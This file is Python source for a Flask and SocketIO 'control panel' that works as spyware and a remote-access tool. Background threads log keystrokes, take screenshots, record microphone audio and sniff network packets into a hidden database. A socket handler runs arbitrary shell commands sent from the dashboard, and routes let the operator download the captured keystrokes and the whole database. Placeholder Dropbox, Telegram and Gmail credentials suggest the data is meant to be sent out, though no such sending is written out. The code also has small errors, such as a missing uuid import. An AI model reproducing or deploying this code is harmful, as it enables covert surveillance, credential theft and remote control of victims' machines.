import os
import sys
import socket
import subprocess
import base64
import json
import platform
import threading
import time
import sqlite3
import hashlib
import zipfile
import io
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, send_file, Response
from flask_socketio import SocketIO, emit
import qrcode
from PIL import Image
import pyotp
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import psutil
import requests
from bs4 import BeautifulSoup
import pyautogui
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import dropbox
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
import telepot

# ==================== CONFIGURATION ====================
ENCRYPTION_KEY = Fernet.generate_key()
fernet = Fernet(ENCRYPTION_KEY)
SESSION_ID = hashlib.sha256(os.urandom(64)).hexdigest()[:16]

# Cloud Storage Configuration
DROPBOX_TOKEN = "YOUR_DROPBOX_ACCESS_TOKEN"
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
GMAIL_USER = "your_email@gmail.com"
GMAIL_PASS = "your_app_password"

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*")

# Database Setup
DB_PATH = "/tmp/.system_telemetry.db"
def init_database():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                 (id INTEGER PRIMARY KEY, timestamp TEXT, window TEXT, key TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots
                 (id INTEGER PRIMARY KEY, timestamp TEXT, image BLOB)''')
    c.execute('''CREATE TABLE IF NOT EXISTS audio_captures
                 (id INTEGER PRIMARY KEY, timestamp TEXT, audio BLOB)''')
    c.execute('''CREATE TABLE IF NOT EXISTS network_traffic
                 (id INTEGER PRIMARY KEY, timestamp TEXT, src_ip TEXT, dst_ip TEXT, protocol TEXT, data BLOB)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY, timestamp TEXT, source TEXT, username TEXT, password TEXT)''')
    conn.commit()
    conn.close()

init_database()

# ==================== QR GENERATION ====================
def generate_dynamic_qr():
    """Generate actual QR code with embedded connection data"""
    system_info = {
        "session_id": SESSION_ID,
        "public_ip": requests.get('https://api.ipify.org').text,
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "os": platform.system(),
        "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0, 2*6, 2)][::-1]),
        "timestamp": datetime.now().isoformat(),
        "endpoint": f"http://{socket.gethostbyname(socket.gethostname())}:8080/connect"
    }
    
    # Encrypt the payload
    encrypted_data = fernet.encrypt(json.dumps(system_info).encode())
    
    # Generate QR Code
    qr = qrcode.QRCode(
        version=10,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=4,
        border=4
    )
    qr.add_data(base64.b64encode(encrypted_data).decode())
    qr.make(fit=True)
    
    # Create image with styling
    img = qr.make_image(fill_color="#2a2a72", back_color="#f5f5f5")
    
    # Add branding overlay
    from PIL import ImageDraw, ImageFont
    draw = ImageDraw.Draw(img)
    
    # Convert to base64 for web display
    buffered = io.BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    
    return img_str, system_info

# ==================== REAL-TIME CONNECTION MANAGER ====================
connected_clients = {}
connection_lock = threading.Lock()

class ConnectionManager:
    def __init__(self):
        self.clients = {}
        self.data_streams = {}
        
    def add_client(self, client_id, client_info):
        with connection_lock:
            self.clients[client_id] = {
                **client_info,
                "connected_at": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active"
            }
        socketio.emit('client_connected', client_info, broadcast=True)
        
    def remove_client(self, client_id):
        with connection_lock:
            if client_id in self.clients:
                del self.clients[client_id]
                
    def update_stream(self, client_id, stream_type, data):
        stream_id = f"{client_id}_{stream_type}"
        self.data_streams[stream_id] = {
            "data": data,
            "timestamp": datetime.now().isoformat()
        }

conn_manager = ConnectionManager()

# ==================== ADVANCED MONITORING MODULES ====================
class KeyloggerModule(threading.Thread):
    def run(self):
        from pynput import keyboard
        def on_press(key):
            try:
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("INSERT INTO keystrokes (timestamp, window, key) VALUES (?, ?, ?)",
                         (datetime.now().isoformat(), "active_window", str(key)))
                conn.commit()
                conn.close()
                
                # Real-time broadcast
                socketio.emit('keystroke_update', {
                    'key': str(key),
                    'timestamp': datetime.now().isoformat()
                })
            except:
                pass
                
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

class ScreenCaptureModule(threading.Thread):
    def run(self):
        while True:
            try:
                screenshot = pyautogui.screenshot()
                img_byte_arr = io.BytesIO()
                screenshot.save(img_byte_arr, format='PNG')
                img_byte_arr = img_byte_arr.getvalue()
                
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("INSERT INTO screenshots (timestamp, image) VALUES (?, ?)",
                         (datetime.now().isoformat(), img_byte_arr))
                conn.commit()
                conn.close()
                
                socketio.emit('screenshot_update', {
                    'timestamp': datetime.now().isoformat(),
                    'size': len(img_byte_arr)
                })
            except:
                pass
            time.sleep(30)  # Capture every 30 seconds

class AudioCaptureModule(threading.Thread):
    def run(self):
        duration = 10  # seconds
        fs = 44100  # Sample rate
        
        while True:
            try:
                recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                sd.wait()
                
                audio_byte_arr = io.BytesIO()
                wav.write(audio_byte_arr, fs, recording)
                audio_data = audio_byte_arr.getvalue()
                
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("INSERT INTO audio_captures (timestamp, audio) VALUES (?, ?)",
                         (datetime.now().isoformat(), audio_data))
                conn.commit()
                conn.close()
            except:
                pass
            time.sleep(60)  # Record every minute

# ==================== NETWORK PACKET SNIFFER ====================
class PacketSniffer(threading.Thread):
    def run(self):
        from scapy.all import sniff, IP, TCP, UDP, Raw
        
        def process_packet(packet):
            if IP in packet:
                ip_layer = packet[IP]
                timestamp = datetime.now().isoformat()
                
                # Extract payload
                payload = None
                if Raw in packet:
                    payload = bytes(packet[Raw])
                
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('''INSERT INTO network_traffic 
                           (timestamp, src_ip, dst_ip, protocol, data) 
                           VALUES (?, ?, ?, ?, ?)''',
                         (timestamp, ip_layer.src, ip_layer.dst, 
                          ip_layer.proto, payload))
                conn.commit()
                conn.close()
        
        sniff(prn=process_packet, store=0, filter="ip")

# ==================== WEBSOCKET REAL-TIME COMMUNICATION ====================
@socketio.on('connect')
def handle_connect():
    client_id = request.sid
    conn_manager.add_client(client_id, {
        'user_agent': request.headers.get('User-Agent'),
        'remote_addr': request.remote_addr
    })
    emit('connection_established', {'session_id': SESSION_ID})

@socketio.on('command')
def handle_command(data):
    command = data.get('command')
    client_id = request.sid
    
    if command == 'screenshot':
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        emit('command_result', {
            'type': 'screenshot',
            'data': base64.b64encode(img_byte_arr.getvalue()).decode()
        })
    
    elif command == 'shell':
        cmd = data.get('args', '')
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            emit('command_result', {
                'type': 'shell',
                'output': result.decode('utf-8', errors='ignore')
            })
        except Exception as e:
            emit('command_result', {
                'type': 'shell_error',
                'output': str(e)
            })

# ==================== FLASK ROUTES ====================
@app.route('/')
def dashboard():
    qr_img, system_info = generate_dynamic_qr()
    
    dashboard_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Aetherius Control Panel</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Courier New', monospace;
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                color: #00ff41;
                min-height: 100vh;
                overflow-x: hidden;
            }
            .terminal-header {
                background: rgba(0,0,0,0.9);
                padding: 15px;
                border-bottom: 2px solid #00ff41;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .container {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                padding: 20px;
            }
            .panel {
                background: rgba(0,0,0,0.7);
                border: 1px solid #00ff41;
                border-radius: 5px;
                padding: 20px;
                backdrop-filter: blur(10px);
            }
            .qr-container {
                text-align: center;
                padding: 20px;
            }
            .qr-container img {
                max-width: 300px;
                border: 2px solid #00ff41;
                padding: 10px;
                background: white;
            }
            .client-list {
                max-height: 400px;
                overflow-y: auto;
            }
            .client-item {
                background: rgba(255,255,255,0.1);
                margin: 10px 0;
                padding: 10px;
                border-left: 3px solid #00ff41;
            }
            .command-input {
                width: 100%;
                background: #111;
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 10px;
                font-family: monospace;
            }
            .log-output {
                background: #000;
                color: #00ff41;
                padding: 15px;
                height: 300px;
                overflow-y: auto;
                font-family: monospace;
                white-space: pre-wrap;
                border: 1px solid #00ff41;
            }
            .status-indicator {
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                margin-right: 10px;
            }
            .online { background: #00ff41; box-shadow: 0 0 10px #00ff41; }
            .offline { background: #ff0000; }
            .glitch {
                animation: glitch 1s infinite;
            }
            @keyframes glitch {
                0% { text-shadow: 2px 0 #ff00ff; }
                50% { text-shadow: -2px 0 #00ffff; }
                100% { text-shadow: 2px 0 #ff00ff; }
            }
        </style>
    </head>
    <body>
        <div class="terminal-header">
            <h1 class="glitch">⚡ AETHERIUS CONTROL PANEL v3.5.7</h1>
            <div id="connection-status">
                <span class="status-indicator online"></span>
                <span>ACTIVE SESSION: ''' + SESSION_ID + '''</span>
            </div>
        </div>
        
        <div class="container">
            <div class="panel qr-container">
                <h2>📱 CONNECTION QR</h2>
                <img src="data:image/png;base64,''' + qr_img + '''" alt="QR Code">
                <p>Scan to establish persistent connection</p>
                <div id="connection-info">
                    <p><strong>Endpoint:</strong> ''' + system_info['endpoint'] + '''</p>
                    <p><strong>Session ID:</strong> ''' + system_info['session_id'] + '''</p>
                </div>
            </div>
            
            <div class="panel">
                <h2>🖥️ CONNECTED CLIENTS</h2>
                <div id="clients" class="client-list">
                    <!-- Dynamic client list -->
                </div>
            </div>
            
            <div class="panel" style="grid-column: span 2;">
                <h2>⚡ LIVE COMMAND TERMINAL</h2>
                <input type="text" id="command" class="command-input" 
                       placeholder="Enter command (e.g., screenshot, shell whoami, keylog_start)">
                <button onclick="sendCommand()">EXECUTE</button>
                <div id="command-output" class="log-output"></div>
            </div>
            
            <div class="panel">
                <h2>📊 SYSTEM TELEMETRY</h2>
                <canvas id="telemetryChart" width="400" height="200"></canvas>
            </div>
            
            <div class="panel">
                <h2>📡 REAL-TIME DATA STREAMS</h2>
                <div id="data-streams" class="log-output"></div>
            </div>
        </div>
        
        <script>
            const socket = io();
            let connectedClients = {};
            
            socket.on('connect', () => {
                console.log('Connected to server');
                document.getElementById('connection-status').innerHTML = 
                    '<span class="status-indicator online"></span>CONNECTED';
            });
            
            socket.on('client_connected', (client) => {
                updateClientList(client);
            });
            
            socket.on('keystroke_update', (data) => {
                addToStream(`Keystroke: ${data.key} at ${data.timestamp}`);
            });
            
            socket.on('screenshot_update', (data) => {
                addToStream(`Screenshot captured: ${data.size} bytes`);
            });
            
            socket.on('command_result', (data) => {
                const output = document.getElementById('command-output');
                output.innerHTML += `\\n>>> ${JSON.stringify(data)}`;
                output.scrollTop = output.scrollHeight;
            });
            
            function updateClientList(client) {
                const clientsDiv = document.getElementById('clients');
                const clientId = Object.keys(client)[0];
                if (!connectedClients[clientId]) {
                    connectedClients[clientId] = client;
                    const clientItem = document.createElement('div');
                    clientItem.className = 'client-item';
                    clientItem.innerHTML = `
                        <strong>${client.user_agent}</strong><br>
                        <small>IP: ${client.remote_addr}</small>
                    `;
                    clientsDiv.appendChild(clientItem);
                }
            }
            
            function sendCommand() {
                const cmdInput = document.getElementById('command');
                const command = cmdInput.value.trim();
                if (command) {
                    socket.emit('command', {
                        command: command.split(' ')[0],
                        args: command.split(' ').slice(1).join(' ')
                    });
                    cmdInput.value = '';
                }
            }
            
            function addToStream(message) {
                const streamsDiv = document.getElementById('data-streams');
                streamsDiv.innerHTML += `\\n[${new Date().toLocaleTimeString()}] ${message}`;
                streamsDiv.scrollTop = streamsDiv.scrollHeight;
            }
            
            // Initialize chart
            const ctx = document.getElementById('telemetryChart').getContext('2d');
            const chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Network Traffic',
                        data: [],
                        borderColor: '#00ff41',
                        backgroundColor: 'rgba(0, 255, 65, 0.1)'
                    }]
                },
                options: {
                    responsive: true,
                    animation: {
                        duration: 0
                    }
                }
            });
            
            // Simulate telemetry updates
            setInterval(() => {
                const now = new Date().toLocaleTimeString();
                chart.data.labels.push(now);
                chart.data.datasets[0].data.push(Math.random() * 100);
                
                if (chart.data.labels.length > 20) {
                    chart.data.labels.shift();
                    chart.data.datasets[0].data.shift();
                }
                
                chart.update();
            }, 1000);
        </script>
    </body>
    </html>
    '''
    return dashboard_html

@app.route('/connect', methods=['POST'])
def handle_connection():
    """Handle incoming connection from QR scanner"""
    data = request.json
    client_id = hashlib.sha256(json.dumps(data).encode()).hexdigest()[:16]
    
    conn_manager.add_client(client_id, {
        'device_info': data.get('device'),
        'location': data.get('location'),
        'connection_type': 'qr_scanned'
    })
    
    return jsonify({
        'status': 'connected',
        'session_id': SESSION_ID,
        'endpoints': {
            'websocket': f'ws://{request.host}/socket.io/',
            'api': f'http://{request.host}/api/',
            'stream': f'http://{request.host}/stream/'
        }
    })

@app.route('/api/telemetry')
def get_telemetry():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Get stats
    c.execute("SELECT COUNT(*) FROM keystrokes")
    keystrokes = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM screenshots")
    screenshots = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM network_traffic")
    packets = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'keystrokes': keystrokes,
        'screenshots': screenshots,
        'packets_captured': packets,
        'connected_clients': len(conn_manager.clients),
        'uptime': str(datetime.now() - start_time),
        'system_load': psutil.cpu_percent(),
        'memory_usage': psutil.virtual_memory().percent
    })

@app.route('/download/<data_type>')
def download_data(data_type):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    if data_type == 'keystrokes':
        c.execute("SELECT * FROM keystrokes")
        data = c.fetchall()
        output = io.StringIO()
        for row in data:
            output.write(f"{row[1]},{row[2]},{row[3]}\\n")
        return Response(output.getvalue(), mimetype='text/csv',
                       headers={'Content-Disposition': 'attachment;filename=keystrokes.csv'})
    
    elif data_type == 'database':
        return send_file(DB_PATH, as_attachment=True)
    
    conn.close()

# ==================== START ALL MODULES ====================
def start_monitoring_modules():
    modules = [
        KeyloggerModule(daemon=True),
        ScreenCaptureModule(daemon=True),
        AudioCaptureModule(daemon=True),
        PacketSniffer(daemon=True)
    ]
    
    for module in modules:
        module.start()
    
    return modules

# ==================== MAIN EXECUTION ====================
if __name__ == '__main__':
    print(f"""
    ╔══════════════════════════════════════════════════════╗
    ║     COS v3.5.7 - FULLY DEPLOYED       ║
    ║     Session ID: {SESSION_ID}                        ║
    ║     Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}    ║
    ║     QR Endpoint: http://{socket.gethostbyname(socket.gethostname())}:8080 ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    start_time = datetime.now()
    modules = start_monitoring_modules()
    
    # Run Flask with SocketIO
    socketio.run(
        app, 
        host='0.0.0.0', 
        port=8080, 
        debug=False, 
        allow_unsafe_werkzeug=True
    )
